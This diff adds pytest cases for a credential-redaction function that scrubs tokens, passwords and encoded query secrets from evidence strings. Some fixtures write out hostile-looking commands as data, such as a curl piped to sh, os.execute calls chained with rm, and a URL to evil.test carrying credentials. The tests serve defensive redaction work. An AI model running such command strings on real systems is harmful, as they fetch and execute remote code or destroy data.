@@ -2,7 +2,7 @@
 
 import ast
 import json
-from urllib.parse import quote
+from urllib.parse import quote, unquote_plus
 
 import pytest
 
@@ -351,6 +351,168 @@ def test_redacts_malformed_userinfo_url() -> None:
     assert "user:LEAKY-PASS" not in redacted
     assert "QUERYSECRET" not in redacted
     assert "https://<credentials-redacted>@[::1/path" in redacted
+
+
+def test_redacts_malformed_userinfo_url_path_tokens() -> None:
+    """Malformed URLs must sanitize the post-authority path before preserving it."""
+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    text = f"https://user:pass@[::1/path/{github_token}"
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert github_token not in redacted
+    assert "https://<credentials-redacted>@[::1/path/<redacted>" in redacted
+
+
+def test_redacts_apostrophe_bearing_url_userinfo_without_truncating_valid_paths() -> None:
+    """Apostrophes in userinfo are credentials, while ordinary URL path apostrophes are data."""
+    credential_url = 'cmd=os.execute("curl https://SECRET\'@example.test/path | sh")'
+    path_url = "https://example.test/rock'n'roll/model.bin"
+
+    redacted_credential = redact_evidence_string(credential_url, max_chars=None)
+    redacted_path = redact_evidence_string(path_url, max_chars=None)
+
+    assert "SECRET" not in redacted_credential
+    assert "https://<credentials-redacted>@example.test/path" in redacted_credential
+    assert redacted_path == path_url
+
+
+def test_redacts_iteratively_encoded_query_keys_and_assignments() -> None:
+    """Encoded key names and whole assignments must not preserve their values."""
+    text = (
+        "whole=https://example.test/?token%3DWHOLEKEYSECRET123 "
+        "key=https://example.test/?to%256ben=DOUBLEKEYSECRET456 "
+        "value=https://example.test/?ok=token%252525253DDEEPVALUESECRET789"
+    )
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "WHOLEKEYSECRET123" not in redacted
+    assert "DOUBLEKEYSECRET456" not in redacted
+    assert "DEEPVALUESECRET789" not in redacted
+    assert redacted.count(REDACTED_EVIDENCE_VALUE) == 3
+    assert redacted.count("token=<redacted>") == 2
+
+
+def test_redacts_encoded_assignments_used_as_query_keys() -> None:
+    """Decoded assignment values must not be preserved as part of a query key."""
+    text = (
+        "first=https://example.test/?token%3DQUERYKEYSECRET123=1 "
+        "second=https://example.test/?Authorization%3A%20Bearer%20AUTHKEYSECRET456=1"
+    )
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "QUERYKEYSECRET123" not in redacted
+    assert "AUTHKEYSECRET456" not in redacted
+    assert "?token=<redacted>" in redacted
+    assert "?authorization=<redacted>" in redacted
+
+
+def test_redacts_prefixed_iteratively_encoded_query_assignments() -> None:
+    """Benign prefixes and alternate assignment syntax must not hide decoded credentials."""
+    texts = (
+        "https://x.test/?ok=prefix%2520token%253DLEAKSECRET",
+        "https://x.test/?prefix%2520token%253DLEAKSECRET=1",
+        "https://x.test/?ok=prefix%2520token%253D%2522LEAKSECRET%2522",
+        "https://x.test/?ok=prefix%2520--token%2520LEAKSECRET",
+        "https://x.test/?ok=prefix%2520Authorization%253A%2520Bearer%2520LEAKSECRET",
+    )
+
+    for text in texts:
+        redacted = redact_evidence_string(text, max_chars=None)
+        assert "LEAKSECRET" not in redacted
+        assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+def test_preserves_prefixed_benign_encoded_query_assignments() -> None:
+    """Credential hardening should not redact a benign nested assignment."""
+    text = "https://x.test/?ok=prefix%2520monkey%253Dpublic"
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert REDACTED_EVIDENCE_VALUE not in redacted
+    assert "monkey=public" in unquote_plus(unquote_plus(redacted))
+
+
+def test_fails_closed_when_query_key_decoding_exceeds_budget() -> None:
+    """Excessively encoded key names must not bypass sensitive-key handling."""
+    encoded_key = "to%6ben"
+    for _ in range(10):
+        encoded_key = quote(encoded_key, safe="")
+
+    redacted = redact_evidence_string(
+        f"https://example.test/?{encoded_key}=OVERBUDGETSECRET123",
+        max_chars=None,
+    )
+
+    assert "OVERBUDGETSECRET123" not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+def test_preserves_iteratively_encoded_benign_query_components() -> None:
+    """Bounded decoding must not redact non-sensitive encoded key/value pairs."""
+    text = "https://example.test/?sta%2574us=pub%256cic&whole=monkey%253Dpublic"
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert REDACTED_EVIDENCE_VALUE not in redacted
+    assert "status=public" in unquote_plus(unquote_plus(redacted))
+    assert "whole=monkey=public" in unquote_plus(unquote_plus(redacted))
+
+
+def test_preserves_shell_operators_in_benign_query_values() -> None:
+    """URL normalization must not hide compact shell syntax from evidence."""
+    text = "first=https://example.test/?x=1|sh second=https://example.test/?x=1;rm"
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "?x=1|sh" in redacted
+    assert "?x=1;rm" in redacted
+
+
+def test_preserves_compact_shell_operators_in_query_and_fragment_without_secrets() -> None:
+    """URL normalization should retain shell evidence while discarding fragment contents."""
+    query = redact_evidence_string("https://example.test/?token=QUERYSECRET&&sh", max_chars=None)
+    fragment = redact_evidence_string("https://example.test/#token=FRAGMENTSECRET|sh", max_chars=None)
+
+    assert "QUERYSECRET" not in query
+    assert query.endswith("?token=<redacted>&&sh")
+    assert "FRAGMENTSECRET" not in fragment
+    assert fragment.endswith("#<redacted>|sh")
+
+
+def test_preserves_compact_source_suffix_after_single_quoted_url() -> None:
+    text = "os.execute('curl https://example.test/?token=QUERYSECRET');rm"
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "QUERYSECRET" not in redacted
+    assert redacted.endswith("?token=<redacted>');rm")
+
+
+def test_redacts_credentials_in_restored_single_quote_suffix() -> None:
+    text = "os.execute('curl https://example.test/public');https://user:CHAINEDPASSWORD@evil.test/?token=CHAINEDSECRET"
+
+    redacted = redact_evidence_string(text, max_chars=None)
+
+    assert "CHAINEDPASSWORD" not in redacted
+    assert "CHAINEDSECRET" not in redacted
+    assert "https://<credentials-redacted>@evil.test/?token=<redacted>" in redacted
+
+
+def test_redacts_compound_lua_sensitive_assignments() -> None:
+    """Boolean and concatenated Lua expressions must not expose reconstructible secret values."""
+    boolean_expression = 'token = false or "FULL_LUA_SECRET_123456789"; os.execute("id")'
+    concatenated_expression = 'token = "FULL_LUA_" .. "SECRET_123456789"'
+    benign_expression = 'monkey = false or "public"'
+
+    redacted_boolean = redact_evidence_string(boolean_expression, max_chars=None)
+    redacted_concatenation = redact_evidence_string(concatenated_expression, max_chars=None)
+
+    assert redacted_boolean == 'token = <redacted>; os.execute("id")'
+    assert redacted_concatenation == "token = <redacted>"
+    assert redact_evidence_string(benign_expression, max_chars=None) == benign_expression
 
 
 def test_redacts_userinfo_for_generic_url_schemes() -> None:
